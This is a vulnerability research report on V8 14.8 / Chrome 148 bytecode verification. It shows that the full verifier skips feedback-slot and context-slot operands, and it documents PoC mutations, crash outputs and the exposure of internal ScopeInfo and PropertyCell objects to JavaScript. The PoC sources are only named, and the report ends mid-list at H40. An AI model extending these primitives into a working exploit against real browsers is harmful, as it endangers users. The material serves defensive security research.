# C18 Bytecode Trust Verdict

**Date:** 2026-04-28
**Target:** V8 14.8.178.9 / Chrome 148 stable
**Surface:** `src/sandbox/bytecode-verifier.cc`, `src/runtime/runtime-test.cc`, `src/objects/bytecode-array-inl.h`

## Summary

C18 is not closed. We found a real verifier sink:

- `BytecodeVerifier::VerifyFull()` validates register operands, constant-pool indexes, runtime IDs, abort reasons, and CFI.
- The same full verifier does **not** validate `OperandType::kContextSlot`.
- Mutated `ContextSlot`, `NativeContextIndex`, and `FeedbackSlot` operands are accepted by `%InstallBytecode()`.
- `ContextSlot` mutations reach Torque unreachable.
- Warmed call/store feedback consumers with `FeedbackSlot=255` produce release `BUS_ADRALN` and ASAN/dcheck feedback-vector failures.
- Warmed named/keyed loads also crash in release.
- `LdaGlobal FBV[255]` can produce a JS-visible wrong value (`7` instead of `13`) without crashing in release.
- A slot matrix shows `LdaGlobal FBV[4]`, `FBV[5]`, and `FBV[255]` can place `ScopeInfo` objects into JS locals before later operations abort.
- The `ScopeInfo` value from `LdaGlobal FBV[4]` can be stored into normal JS object/array fields and survive GC in release and Linux sandbox-testing.
- Follow-on probes show that the stored internal value survives equality, property reads, array iteration, spread, and an optimized caller in release.
- `JSON.stringify()` over a poisoned container hits a release fatal `Check failed: IsJSReceiver(*object)`.
- GC/IC stress over repeated poisoned containers hits release `unreachable code` in `FeedbackNexus::GetFirstMap()` / `Runtime_LoadGlobalIC_Miss`.
- Object copy/introspection, `Map`, `Set`, delete/overwrite/freeze/seal, `Object.prototype.toString`, and `Boolean()` tolerate the poisoned value.
- `Array.prototype.join`, `typeof`, and `String()` fatally consume the poisoned value in release.
- H37/H38 remove `%InstallBytecode()` from the chain: valid bytecode plus sandbox `FeedbackVector` slot corruption is enough to make `LdaGlobal FBV[0]` return a non-global/internal value and hit release fatal consumers.
- H39 maps valid-bytecode `FeedbackVector[src] -> slot0` poisoning: some source slots produce stable wrong JS values, some produce inside-sandbox memory access, and many later trip `IsPropertyCell`.
- H40-H43 find a cleaner valid-object corruption: copying another global load's valid `PropertyCell` into `f`'s `FeedbackVector[0]` makes unchanged `f(){return A}` read `B`; the alias is live and survives an optimized caller with no dcheck failure.
- H44 store-global redirection matrix did not redirect writes.
- H45 `FeedbackVector.shared_function_info` mismatch reaches compiler/broker checks but remains harmless termination.
- H46/H47 extend the `PropertyCell` alias across d8 realms, including `Realm.create()` without cross-realm access mode.

This is not a VRP-grade exploit yet. H1-H36 use `%GetBytecode()` / `%InstallBytecode()` test intrinsics to create impossible JS bytecode. H37-H39 remove bytecode mutation but still use the sandbox memory-corruption API to corrupt `FeedbackVector` state. Linux `--sandbox-testing` classifies crash cases as safe-region/harmless, not sandbox violations. Still, the sink class is now broad and includes visible wrong-result behavior.

## Source finding

Relevant code:

- `src/sandbox/bytecode-verifier.cc:17-28`: `Verify()` calls `VerifyFull()` or `VerifyLight()`, then `bytecode->MarkVerified(isolate)`.
- `src/sandbox/bytecode-verifier.cc:85-103`: `VerifyFull()` claims full verification of register accesses and embedded IDs.
- `src/sandbox/bytecode-verifier.cc:158-173`: `kConstantPoolIndex`, `kRuntimeId`, and `kAbortReason` are checked.
- `src/sandbox/bytecode-verifier.cc:174-185`: `kFeedbackSlot`, `kContextSlot`, `kNativeContextIndex`, flags, immediates, and coverage slots fall through with no check.
- `src/objects/bytecode-array-inl.h:179-190`: `MarkVerified()` publishes the `BytecodeArray` to the sandbox and updates the wrapper.
- `src/runtime/runtime-test.cc:2699-2784`: `%InstallBytecode()` builds a new `BytecodeArray`, runs `BytecodeVerifier::Verify()`, then installs it into the function.
- `src/interpreter/bytecode-array-writer.cc:54-58`: normal bytecode generation also verifies before publishing.
- `src/objects/shared-function-info.cc:881-896`: debug bytecode is copied from an existing bytecode array and activated without re-verifying the copy.
- `src/debug/debug-evaluate.cc:1615-1620` and `src/interpreter/bytecode-array-iterator.cc:114-124`: side-effect debug instrumentation only patches the opcode to a matching `DebugBreak*`; operands are preserved.
- `src/codegen/code-stub-assembler.cc:13512-13542`: `UpdateEmbeddedFeedback()` can write into a verified `BytecodeArray` after publication, but only ORs bounded binary/compare feedback bits into embedded-feedback operands.

## H1: ContextSlot read OOB

PoC: `poc/h1-context-slot-read-oob.js`

Mutation:

```text
LdaImmutableCurrentContextSlot [2] -> LdaImmutableCurrentContextSlot [255]
```

Evidence:

- `evidence/h1-release.txt`
- `evidence/h1-asan.txt`
- `evidence/h1-linux-sandbox-release.txt`
- `evidence/h1-linux-sandbox-dcheck.txt`

Observed:

```text
baseline 13
bytecode 25,2,186,0,185
install
run
halting because of unreachable code at src/builtins/torque-internal.tq:113:45
EXIT:133
```

Linux sandbox-testing:

```text
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
...
Caught harmless signal (SIGTRAP). Exiting process...
EXIT:0
```

Verdict: **CONFIRMED-CRASH / VERIFIER-BYPASS-SINK**.

Impact so far: invalid bytecode accepted by full verifier and executed until internal unreachable. Not sandbox escape as-is.

## H2: ContextSlot write OOB

PoC: `poc/h2-context-slot-write-oob.js`

Mutation:

```text
StaCurrentContextSlotNoCell [2] -> StaCurrentContextSlotNoCell [255]
```

Evidence:

- `evidence/h2-release.txt`
- `evidence/h2-asan.txt`
- `evidence/h2-linux-sandbox-release.txt`
- `evidence/h2-linux-sandbox-dcheck.txt`

Observed:

```text
bytecode 145,0,1,28,249,16,39,2,13,13,39,2,141,1,0,2,185
install
run
halting because of unreachable code at src/builtins/torque-internal.tq:113:45
EXIT:133
```

Linux sandbox-testing:

```text
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
...
Caught harmless signal (SIGTRAP). Exiting process...
EXIT:0
```

Verdict: **CONFIRMED-CRASH / VERIFIER-BYPASS-SINK**.

Impact so far: invalid bytecode accepted by full verifier and executed until internal unreachable. Not sandbox escape as-is.

## H3: FeedbackSlot OOB

PoC: `poc/h3-feedback-slot-oob.js`

Mutation:

```text
GetNamedProperty a0, [0], [0] -> GetNamedProperty a0, [0], [255]
```

Evidence:

- `evidence/h3-release.txt`
- `evidence/h3-asan.txt`

Observed:

```text
bytecode 51,3,0,0,185
install
run
2
EXIT:0
```

Verdict: **LOW-SIGNAL / REFUTED FOR THIS SHAPE**.

The verifier accepts the operand, but this simple named-load path does not produce a crash, divergence, or visible corruption.

## H4: ConstantPool OOB control

PoC: `poc/h4-constant-pool-oob-control.js`

Mutation:

```text
LdaConstant [0] -> LdaConstant [255]
```

Evidence:

- `evidence/h4-release.txt`
- `evidence/h4-asan.txt`

Observed:

```text
Fatal error
Bytecode verification failed: Constant pool index out of bounds
...
BytecodeVerifier::VerifyFull
Runtime_InstallBytecode
EXIT:133
```

Verdict: **CONTROL-PASSED**.

This proves the harness is exercising `VerifyFull()` and that checked operand classes are rejected before install.

## H5: NativeContextIndex OOB

PoC: `poc/h5-native-context-index-oob.js`

Shape:

```text
eval(...args)
```

This generates:

```text
CallJSRuntime [reflect_apply], r2-r4
```

Mutation:

```text
NativeContextIndex reflect_apply -> 255
```

Evidence:

- `evidence/h5-release.txt`
- `evidence/h5-asan.txt`

Observed:

```text
baseline 3
...
mutate 58 8 -> 255
install
run
Error: 3+4
EXIT:0
```

Verdict: **LOW-SIGNAL / SEMANTIC DIVERGENCE ONLY**.

The verifier accepts an out-of-range `NativeContextIndex`, but this shape calls/loads a wrong native-context entry and exits through a JS-visible error. No memory-safety signal yet.

## H6: Call feedback slot OOB after feedback vector warmup

PoC: `poc/h6-call-feedback-slot-oob-warm.js`

Shape:

```text
o.m(x, 1)
```

After warmup, bytecode:

```text
GetNamedProperty a0, [0:"m"], FBV[0]
CallProperty2 r0, a0, a1, r3, FBV[2]
```

Mutation:

```text
CallProperty2 ... FBV[2] -> FBV[255]
```

Evidence:

- `evidence/h6-release.txt`
- `evidence/h6-release-interpreter-only.txt`
- `evidence/h6-asan.txt`
- `evidence/h6-asan-interpreter-only.txt`
- `evidence/h6-linux-sandbox-release.txt`
- `evidence/h6-linux-sandbox-dcheck.txt`

Observed release:

```text
baseline 11
bytecode 51,3,0,0,212,13,1,209,106,249,3,4,246,2,185
mutate-call 8 2 -> 255
install
run
Received signal 10 BUS_ADRALN
EXIT:138
```

Observed ASAN/dcheck:

```text
abort: CSA_DCHECK failed: IsOffsetInBounds(offset, LoadFeedbackVectorLength(feedback_vector), FeedbackVector::kHeaderSize)
[../../src/codegen/code-stub-assembler.cc:4259]
[../../src/builtins/ic.tq:13]
[../../src/interpreter/interpreter-generator.cc:1632]

 * SmiFromIntPtr(offset): 1051
 * feedback_vector: <FeedbackVector[4]>
```

Linux sandbox-testing release:

```text
Caught harmless memory access violation (safe region). Exiting process...
EXIT:0
```

Linux sandbox-testing dcheck:

```text
Safely terminating process due to CSA check failure
The following harmless failure was encountered: IsOffsetInBounds(offset, LoadFeedbackVectorLength(feedback_vector), FeedbackVector::kHeaderSize)
EXIT:0
```

Verdict: **CONFIRMED-CRASH / FEEDBACK-VECTOR-OOB-SINK**.

Impact so far:

- verifier accepts malformed `FeedbackSlot`;
- interpreter consumes it as feedback-vector offset;
- release crashes with OOB/safe-region memory access;
- Linux sandbox-testing says the access remains in safe/sandbox region.

This is stronger than H1/H2 because it reaches a concrete indexed memory access (`FeedbackVector`) instead of immediate Torque unreachable.

## H7: AddSmi feedback slot OOB after feedback vector warmup

PoC: `poc/h7-addsmi-feedback-slot-oob-warm.js`

Mutation:

```text
AddSmi [1], FBV[0] -> AddSmi [1], FBV[255]
```

Evidence:

- `evidence/h7-release.txt`
- `evidence/h7-asan.txt`

Observed release:

```text
baseline 11
bytecode 11,3,79,1,0,185
mutate-arith 2 0 -> 255
install
run
21
EXIT:0
```

Observed ASAN/dcheck after execution:

```text
Debug check failed: HasFeedbackMetadata(kAcquireLoad).
...
MaglevGraphBuilder::VisitBinarySmiOperation
EXIT:133
```

Verdict: **LOW-SIGNAL / COMPILER-ONLY DCHECK**.

The mutated arithmetic feedback slot does not affect release execution in this shape. The ASAN/dcheck failure is from later Maglev feedback inspection, not a release crash.

## H8: Named store feedback slot OOB after feedback vector warmup

PoC: `poc/h8-named-store-feedback-slot-oob-warm.js`

Mutation:

```text
SetNamedProperty a0, [0:"x"], FBV[0] -> FBV[255]
```

Evidence:

- `evidence/h8-release-interpreter-only.txt`
- `evidence/h8-asan-interpreter-only.txt`
- `evidence/h8-linux-sandbox-release.txt`

Observed release, interpreter-only:

```text
baseline 10
bytecode 11,4,58,3,0,0,51,3,0,2,185
mutate-setnamed 2 0 -> 255
install
run
Received signal 10 BUS_ADRALN
EXIT:138
```

Observed ASAN/dcheck:

```text
Debug check failed: HasFeedbackMetadata().
...
FeedbackVector::GetKind
Runtime_StoreIC_Miss
EXIT:133
```

Linux sandbox-testing release:

```text
Caught harmless memory access violation (safe region). Exiting process...
EXIT:0
```

Verdict: **CONFIRMED-CRASH / STORE-FEEDBACK-OOB-SINK**.

This is a write-side feedback consumer. It reaches release memory access violation, but Linux sandbox-testing still classifies the access as safe-region.

## H9: Keyed store feedback slot OOB after feedback vector warmup

PoC: `poc/h9-keyed-store-feedback-slot-oob-warm.js`

Mutation:

```text
SetKeyedProperty a0, a1, FBV[0] -> FBV[255]
```

Evidence:

- `evidence/h9-release-interpreter-only.txt`
- `evidence/h9-asan-interpreter-only.txt`
- `evidence/h9-linux-sandbox-release.txt`

Observed release, interpreter-only:

```text
baseline 10
bytecode 11,5,60,3,4,0,11,4,53,3,2,185
mutate-setkeyed 2 0 -> 255
install
run
Received signal 10 BUS_ADRALN
EXIT:138
```

Observed ASAN/dcheck:

```text
Debug check failed: HasFeedbackMetadata().
...
FeedbackVector::GetKind
Runtime_KeyedStoreIC_Miss
EXIT:133
```

Linux sandbox-testing release:

```text
Caught harmless memory access violation (safe region). Exiting process...
EXIT:0
```

Verdict: **CONFIRMED-CRASH / KEYED-STORE-FEEDBACK-OOB-SINK**.

This confirms the H6 issue is a broader feedback operand class, not just a call handler.

## H11: Named load feedback slot OOB after feedback vector warmup

PoC: `poc/h11-named-load-feedback-slot-oob-warm.js`

Mutation:

```text
GetNamedProperty a0, [0:"x"], FBV[0] -> FBV[255]
```

Evidence:

- `evidence/h11-release-interpreter-only.txt`
- `evidence/h11-release-defaultverify.txt`
- `evidence/h11-asan-interpreter-only.txt`
- `evidence/h11-linux-sandbox-release.txt`

Observed release:

```text
baseline 13
bytecode 51,3,0,0,185
mutate-getnamed 0 0 -> 255
install
run
Received signal 10 BUS_ADRALN
EXIT:138
```

Observed ASAN/dcheck:

```text
Debug check failed: HasFeedbackMetadata().
...
FeedbackVector::GetKind
Runtime_LoadIC_Miss
EXIT:133
```

Linux sandbox-testing release:

```text
Caught harmless memory access violation (safe region). Exiting process...
EXIT:0
```

Verdict: **CONFIRMED-CRASH / LOAD-FEEDBACK-OOB-SINK**.

This also reproduces without `--verify-bytecode-full`; default/light verification does not reject the malformed feedback slot.

## H12: Keyed load feedback slot OOB after feedback vector warmup

PoC: `poc/h12-keyed-load-feedback-slot-oob-warm.js`

Mutation:

```text
GetKeyedProperty a0, FBV[0] -> FBV[255]
```

Evidence:

- `evidence/h12-release-interpreter-only.txt`
- `evidence/h12-release-defaultverify.txt`
- `evidence/h12-asan-interpreter-only.txt`
- `evidence/h12-linux-sandbox-release.txt`

Observed release:

```text
baseline 13
bytecode 11,4,53,3,0,185
mutate-getkeyed 2 0 -> 255
install
run
Received signal 10 BUS_ADRALN
EXIT:138
```

Observed ASAN/dcheck:

```text
Debug check failed: HasFeedbackMetadata().
...
FeedbackNexus::FeedbackNexus
Runtime_KeyedLoadIC_Miss
EXIT:133
```

Linux sandbox-testing release:

```text
Caught harmless memory access violation (safe region). Exiting process...
EXIT:0
```

Verdict: **CONFIRMED-CRASH / KEYED-LOAD-FEEDBACK-OOB-SINK**.

Also reproduces with default/light bytecode verification.

## H13: Global load feedback slot OOB direct print

PoC: `poc/h13-global-load-feedback-slot-oob-warm.js`

Mutation:

```text
LdaGlobal [name], FBV[0] -> FBV[255]
```

Evidence:

- `evidence/h13-release-interpreter-only.txt`
- `evidence/h13-asan-interpreter-only.txt`

Observed release:

```text
baseline 13
bytecode 35,0,0,185
mutate-ldaglobal 0 0 -> 255
install
run
Stacktrace:
...
ApiCallbackExitFrame print(..., ScopeInfo SCRIPT_SCOPE)
EXIT:133
```

Observed ASAN:

```text
Received signal 10 BUS_ADRALN
EXIT:138
```

Verdict: **CONFIRMED-CRASH / GLOBAL-LOAD-FEEDBACK-OOB-SINK**.

H13 showed the direct `print(f())` path receiving an unexpected internal-looking value in the API callback stack. H17 isolates the value-flow more cleanly.

## H14: Global store feedback slot OOB after feedback vector warmup

PoC: `poc/h14-global-store-feedback-slot-oob-warm.js`

Mutation:

```text
StaGlobal [name], FBV[0] -> FBV[255]
```

Evidence:

- `evidence/h14-release-interpreter-only.txt`

Observed:

```text
baseline 13
bytecode 11,3,37,0,0,35,0,2,185
mutate-staglobal 2 0 -> 255
install
run
13
EXIT:0
```

Verdict: **LOW-SIGNAL / NO RELEASE IMPACT IN THIS SHAPE**.

## H15: Inc feedback slot OOB after feedback vector warmup

PoC: `poc/h15-inc-feedback-slot-oob-warm.js`

Mutation:

```text
Inc FBV[2] -> FBV[255]
```

Evidence:

- `evidence/h15-release-interpreter-only.txt`

Observed:

```text
baseline 1001
bytecode 51,3,0,0,91,2,211,58,3,0,3,11,248,185
mutate-inc 4 2 -> 255
install
run
1002
EXIT:0
```

Verdict: **LOW-SIGNAL / NO RELEASE IMPACT IN THIS SHAPE**.

## H16: Compare EmbeddedFeedback OOB

PoC: `poc/h16-compare-embedded-feedback-oob-warm.js`

Mutation:

```text
TestLessThan a0, EmbeddedFeedback[0x0001] -> EmbeddedFeedback[0xffff]
```

Evidence:

- `evidence/h16-release-interpreter-only.txt`

Observed:

```text
baseline true
bytecode 11,4,121,3,1,0,185
mutate-embedded 2 1 0 -> 255 255
install
run
true
EXIT:0
```

Verdict: **LOW-SIGNAL / NO RELEASE IMPACT IN THIS SHAPE**.

`EmbeddedFeedback` remains unchecked by the verifier, but this compare path did not produce visible impact.

## H17: Global load feedback slot wrong-value exposure

PoC: `poc/h17-global-load-feedback-slot-object-exposure.js`

H17 avoids printing the returned value directly. It stores the result from `LdaGlobal FBV[255]`, then checks `typeof`, strict equality to `undefined`, and `%DebugPrint`.

Evidence:

- `evidence/h17-release-interpreter-only.txt`
- `evidence/h17-release-defaultverify.txt`
- `evidence/h17-asan-interpreter-only.txt`
- `evidence/h17-linux-sandbox-release.txt`

Observed release:

```text
baseline 13
bytecode 35,0,0,185
mutate-ldaglobal 0 0 -> 255
install
run
after-call
typeof number
eq-undefined false
7
debugprint-ok
EXIT:0
```

Linux sandbox-testing release:

```text
typeof number
eq-undefined false
DebugPrint: Smi: 0x7 (7)
debugprint-ok
EXIT:0
```

ASAN/dcheck:

```text
abort: CSA_DCHECK failed: IsWeakOrCleared(maybe_weak_ref)
[../../src/ic/accessor-assembler.cc:3958]
```

Relevant source:

- `src/ic/accessor-assembler.cc:3930-3975`: `LoadGlobalIC_TryPropertyCellCase()` calls `LoadFeedbackVectorSlot(vector, slot)`.
- If the out-of-bounds feedback value is a Smi, the handler treats it as lexical-variable metadata and loads a context slot.

Verdict: **CONFIRMED-DIVERGENCE / GLOBAL-LOAD-FEEDBACK-OOB-WRONG-VALUE**.

This is the most interesting C18 result so far because it is not just a crash. A malformed verified bytecode feedback slot changes a global load result from `13` to `7` in release and under Linux sandbox-testing.

## H18: Global load feedback slot matrix

PoC: `poc/h18-global-load-feedback-slot-matrix.js`

Evidence:

- `evidence/h18-global-load-slot-matrix-release.txt`
- `evidence/h18-slot4-linux-sandbox-release.txt`

The matrix mutates:

```text
LdaGlobal [C18_GLOBAL_MATRIX], FBV[0] -> FBV[n]
```

Representative release results:

```text
slot=0 baseline=13 type=number same=true
13

slot=1 baseline=13 type=undefined same=false
undefined

slot=4:
var r = <ScopeInfo FUNCTION_SCOPE>
abort: Unexpected instance type encountered

slot=5:
var r = <ScopeInfo SCRIPT_SCOPE>
abort: Unexpected instance type encountered

slot=6..32:
type=string same=false
<String[9]: #undefined>

slot=63:
type=number same=false
632448

slot=128:
type=string same=false
[weak cleared]

slot=255:
var r = <ScopeInfo SCRIPT_SCOPE>
abort: Unexpected instance type encountered
```

Linux sandbox-testing slot 4:

```text
Sandbox testing mode is enabled.
...
var r = <ScopeInfo FUNCTION_SCOPE>
abort: Unexpected instance type encountered
EXIT:0
```

Verdict: **CONFIRMED-DIVERGENCE / INTERNAL-OBJECT-EXPOSURE-SINK**.

H18 is stronger than H17. It shows the out-of-bounds global feedback slot can make `LdaGlobal` return internal `ScopeInfo` objects into JS-frame locals. The process aborts when normal JS operations try to treat that value as a JS value, but the bad value has already crossed into the JS execution state.

## H19: Store exposed ScopeInfo into JS object/array and GC

PoC: `poc/h19-global-load-scopeinfo-store-gc.js`

Shape:

```text
LdaGlobal [C18_GLOBAL_STORE_INTERNAL], FBV[4] -> returns ScopeInfo-like value
box.v = r
arr[0] = r
gc()
load box.v / arr[0]
gc()
```

Evidence:

- `evidence/h19-release-defaultverify.txt`
- `evidence/h19-asan-defaultverify.txt`
- `evidence/h19-linux-sandbox-release.txt`

Observed release:

```text
baseline 13
call
returned
stored
gc1-ok
loaded
gc2-ok
EXIT:0
```

Observed ASAN:

```text
baseline 13
call
returned
stored
gc1-ok
loaded
gc2-ok
EXIT:0
```

Linux sandbox-testing release:

```text
baseline 13
call
returned
stored
gc1-ok
loaded
gc2-ok
EXIT:0
```

Verdict: **CONFIRMED-INTERNAL-VALUE-STORAGE / GC-SURVIVES**.

This shows the internal value can be written into ordinary JS containers and survive GC if it is not inspected by operations that assert JS value type.

## H20: Store exposed ScopeInfo with debug/checking path

PoC: `poc/h20-global-load-scopeinfo-stored-debugprint.js`

Evidence:

- `evidence/h20-release-defaultverify.txt`
- `evidence/h20-asan-defaultverify.txt`

Observed release:

```text
box-debug
<Object ...>
arr-debug
<JSArray[1]>
done
EXIT:0
```

Observed ASAN/dcheck:

```text
Fatal error in ../../src/ic/ic.cc, line 2170
Debug check failed: TrustedCast<JSAny>
...
StoreIC::Store
Runtime_DefineNamedOwnIC_Miss
EXIT:133
```

Verdict: **CONFIRMED-JSANY-BOUNDARY-VIOLATION**.

ASAN/dcheck catches the exact invariant: an internal object returned by malformed bytecode is being stored where a JS value (`JSAny`) is required. Release accepts the operation.

## H21: Property read and equality over stored ScopeInfo

PoC: `poc/h21-scopeinfo-property-read-equality.js`

Evidence:

- `evidence/h21-release-defaultverify.txt`

Observed release:

```text
start
loaded
same_field true
same_arr true
cross_same true
done
EXIT:0
```

Verdict: **CONFIRMED-STABLE-PROPAGATION**.

The internal value is stable as an object-property value and array-element value. Strict equality over the poisoned slots works and sees the same identity. This is not a crash, but it confirms the value is not immediately sanitized after storage.

## H22: JSON.stringify over poisoned container

PoC: `poc/h22-scopeinfo-json-string-conversion.js`

Evidence:

- `evidence/h22-release-defaultverify.txt`
- `evidence/h22-asan-defaultverify.txt`
- `evidence/h22-linux-sandbox-release.txt`

Observed release:

```text
start
Fatal error
Check failed: IsJSReceiver(*object).
JsonStringifier::Serialize_
Builtin_JsonStringify
EXIT:133
```

Observed ASAN/dcheck:

```text
Fatal error in ../../src/ic/ic.cc, line 2170
Debug check failed: TrustedCast<JSAny>
StoreIC::Store
Runtime_DefineNamedOwnIC_Miss
EXIT:133
```

Linux sandbox-testing release:

```text
Safely terminating process
The following harmless error was encountered: Check failed: IsJSReceiver(*object).
EXIT:0
```

Verdict: **CONFIRMED-RELEASE-FATAL-CHECK / JSANY-CONSUMER**.

Release accepts the poisoned JS container, but JSON serialization later assumes the contained value satisfies `JSAny`/receiver invariants and fatals. Sandbox-testing still classifies this as harmless, so it is not a sandbox escape.

## H23: Array iteration, spread, includes

PoC: `poc/h23-scopeinfo-array-iteration-spread.js`

Evidence:

- `evidence/h23-release-defaultverify.txt`

Observed release:

```text
start
iter-count 1
spread-len 1
includes true
done
EXIT:0
```

Verdict: **PROPAGATION-OK / LOW-IMMEDIATE-IMPACT**.

Array iteration and spread can move the poisoned value without immediate fatal. This increases chainability but is not a standalone impact.

## H24: Optimized caller forwards poisoned container

PoC: `poc/h24-scopeinfo-optimized-caller.js`

Evidence:

- `evidence/h24-release-defaultverify.txt`

Observed release:

```text
first
optimized-box
loaded
done
EXIT:0
```

Verdict: **OPT-CALLER-SURVIVES / LOW-IMMEDIATE-IMPACT**.

An optimized caller can receive and forward the poisoned container in this shape. No optimizer miscompile was observed yet, but the primitive crosses a tiered caller boundary.

## H25: GC/IC stress with many poisoned containers

PoC: `poc/h25-scopeinfo-gc-stress-many-containers.js`

Evidence:

- `evidence/h25-release-defaultverify.txt`
- `evidence/h25-asan-defaultverify.txt`
- `evidence/h25-linux-sandbox-release.txt`

Observed release:

```text
start
Fatal error
unreachable code
FeedbackNexus::GetFirstMap() const
FeedbackNexus::ic_state() const
Runtime_LoadGlobalIC_Miss
EXIT:133
```

Observed ASAN/dcheck:

```text
Fatal error in ../../src/ic/ic.cc, line 2170
Debug check failed: TrustedCast<JSAny>
StoreIC::Store
Runtime_DefineNamedOwnIC_Miss
EXIT:133
```

Linux sandbox-testing release:

```text
Safely terminating process
The following harmless error was encountered: unreachable code
EXIT:0
```

Verdict: **CONFIRMED-RELEASE-FATAL / FEEDBACKNEXUS-CONSUMER**.

Repeated poisoned global-load results plus normal object storage and GC stress can push execution into a release fatal in IC state handling. This strengthens the sink, but still does not cross sandbox bounds.

## H26-H29: Object and collection propagation

PoCs:

- `poc/h26-scopeinfo-object-copy-assign-spread.js`
- `poc/h27-scopeinfo-object-introspection.js`
- `poc/h28-scopeinfo-map-set-weakmap.js`
- `poc/h29-scopeinfo-overwrite-delete-freeze.js`

Evidence:

- `evidence/h26-release-defaultverify.txt`
- `evidence/h27-release-defaultverify.txt`
- `evidence/h28-release-defaultverify.txt`
- `evidence/h29-release-defaultverify.txt`

Observed release:

```text
assign-ok 1 true
spread-ok 1 true
keys v,ok
values-len 2
entries-len 2
descriptor true true
map-value true
set-has true
weakmap-throw TypeError:Invalid value used as weak map key
deleted true
overwritten 42
frozen true
sealed true true
EXIT:0
```

Verdict: **PROPAGATION-OK / CHAINABILITY**.

These operations do not crash. They show the poisoned value can cross object copy, enumeration, descriptor creation, `Map`/`Set` value storage, deletion, overwrite, freeze, and seal paths. `WeakMap` rejects it as a non-object key with normal `TypeError`.

## H30-H36: Array and coercion consumers

PoCs:

- `poc/h30-scopeinfo-array-methods.js`
- `poc/h31-scopeinfo-direct-coercions.js`
- `poc/h32-scopeinfo-array-join-only.js`
- `poc/h33-scopeinfo-typeof-only.js`
- `poc/h34-scopeinfo-string-only.js`
- `poc/h35-scopeinfo-object-to-string-only.js`
- `poc/h36-scopeinfo-boolean-only.js`

Evidence:

- `evidence/h30-release-defaultverify.txt`
- `evidence/h30-asan-defaultverify.txt`
- `evidence/h30-linux-sandbox-release.txt`
- `evidence/h31-release-defaultverify.txt`
- `evidence/h31-asan-defaultverify.txt`
- `evidence/h31-linux-sandbox-release.txt`
- `evidence/h32-release-defaultverify.txt`
- `evidence/h32-asan-defaultverify.txt`
- `evidence/h32-linux-sandbox-release.txt`
- `evidence/h33-release-defaultverify.txt`
- `evidence/h33-asan-defaultverify.txt`
- `evidence/h33-linux-sandbox-release.txt`
- `evidence/h34-release-defaultverify.txt`
- `evidence/h34-asan-defaultverify.txt`
- `evidence/h34-linux-sandbox-release.txt`
- `evidence/h35-release-defaultverify.txt`
- `evidence/h36-release-defaultverify.txt`
- `evidence/h32-release-fullverify.txt`

Observed release propagation before fatal:

```text
index 0
map-len 3
filter-len 1
slice-same true
```

Isolated release fatal consumers:

```text
H32 Array.prototype.join: Stacktrace ... join(... JSArray[3])
H33 typeof: abort: Unexpected instance type encountered
H34 String(): Stacktrace ... String(... <ScopeInfo FUNCTION_SCOPE>)
```

Observed release tolerant consumers:

```text
H35 Object.prototype.toString.call(box.v) -> [object Object]
H36 Boolean(box.v) -> true
```

Observed ASAN/dcheck:

```text
H32: CSA_DCHECK failed: Torque assert 'Is<A>(o)' failed ... builtins/base.tq:654
H33/H34: Debug check failed: TrustedCast<JSAny> ... StoreIC::Store
```

Linux sandbox-testing release:

```text
H32/H33/H34: EXIT:0
```

Verdict: **CONFIRMED-RELEASE-FATAL-CONSUMERS / PROPAGATION-MAP**.

`Array.join`, `typeof`, and `String()` are concrete release consumers that cannot handle the internal value after it has been accepted into JS state. `Object.prototype.toString` and `Boolean` tolerate it, giving more chainable operations.

`h32-release-fullverify.txt` confirms this path also survives explicit `--verify-bytecode-full`; the full verifier does not reject the bad feedback slot before `Array.join` fatals.

## H37-H38: Valid bytecode, corrupted FeedbackVector slot

PoCs:

- `poc/h37-valid-bytecode-feedbackvector-slot-copy.js`
- `poc/h38-valid-bytecode-feedbackvector-join.js`

Evidence:

- `evidence/h37-linux-sandbox-release.txt`
- `evidence/h37-linux-sandbox-dcheck.txt`
- `evidence/h38-linux-sandbox-release.txt`
- `evidence/h38-linux-sandbox-dcheck.txt`

H37 keeps bytecode valid. It allocates a normal feedback vector, then uses the sandbox memory-corruption API to copy `FeedbackVector` slot 4 into slot 0:

```text
baseline=13
fv=0x101f9f1 slot0=0x101f8fb slot4=0x101f6b3
returned
same-global false
abort: Unexpected instance type encountered
Safely terminating process
The following harmless error was encountered: Check failed: IsPropertyCell(*feedback_value).
EXIT:0
```

H37 dcheck:

```text
Ignoring debug check failure in ../../src/ic/ic.cc, line 2170:
TrustedCast<JSAny>
...
Check failed: IsPropertyCell(*feedback_value).
EXIT:0
```

H38 feeds the same valid-bytecode/poisoned-vector result into `Array.join`:

```text
start
same-global false
Safely terminating process
The following harmless error was encountered: Check failed: IsPropertyCell(*feedback_value).
EXIT:0
```

H38 dcheck:

```text
Safely terminating process due to CSA check failure
Torque assert 'Is<A>(o)' failed [src/builtins/cast.tq:963] [../../src/builtins/base.tq:654]
EXIT:0
```

Verdict: **CONFIRMED-SANDBOX-POST-CORRUPTION-SINK / VALID-BYTECODE**.

This is materially stronger than H18-H36 because `%InstallBytecode()` is no longer needed. The remaining artificial part is the sandbox memory-corruption API, which models an attacker who can corrupt in-sandbox heap fields. Under that model, a corrupted `FeedbackVector` slot causes a valid `LdaGlobal` bytecode to return a non-global/internal value and then reach release fatal consumers. Linux sandbox-testing still classifies the failure as harmless, so this is not a sandbox escape.

## H39: Valid-bytecode FeedbackVector source-slot matrix

PoC: `poc/h39-valid-bytecode-feedbackvector-copy-matrix.js`

Evidence:

- `evidence/h39-linux-sandbox-release-matrix.txt`

Shape:

```text
valid function f() { return C18_H39_GLOBAL; }
copy FeedbackVector[src] -> FeedbackVector[0]
execute unchanged LdaGlobal FBV[0]
```

Representative release sandbox results:

```text
src=0  same=true   tag [object Number]
src=2  Caught harmless memory access violation (inside sandbox)
src=3  Caught harmless memory access violation (inside sandbox)
src=4  same=false  tag [object Object]
src=6  same=false  tag [object String]
src=7  same=false  tag [object String]
src=8  same=false  tag [object String]
src=10 same=false  tag [object String]
src=14 same=false  tag [object String]
src=31 same=false  tag [object String]
src=63 same=true   tag [object Number]
```

Many wrong-value cases later terminate harmlessly with:

```text
Check failed: IsPropertyCell(*feedback_value).
```

Verdict: **CONFIRMED-VALID-BYTECODE-WRONG-VALUE-MATRIX / POST-CORRUPTION-SINK**.

H39 proves the valid-bytecode variant is not a one-off. Different corrupted feedback-vector source slots produce different wrong value classes: object/internal-looking, string, number, fatal check, and inside-sandbox memory access. This is still bounded by the sandbox corruption model, but it is now a clear impact map for `LdaGlobal` feedback-vector poisoning.

## H40-H43: Cross-global PropertyCell alias with valid bytecode

PoCs:

- `poc/h40-valid-bytecode-cross-global-propertycell.js`
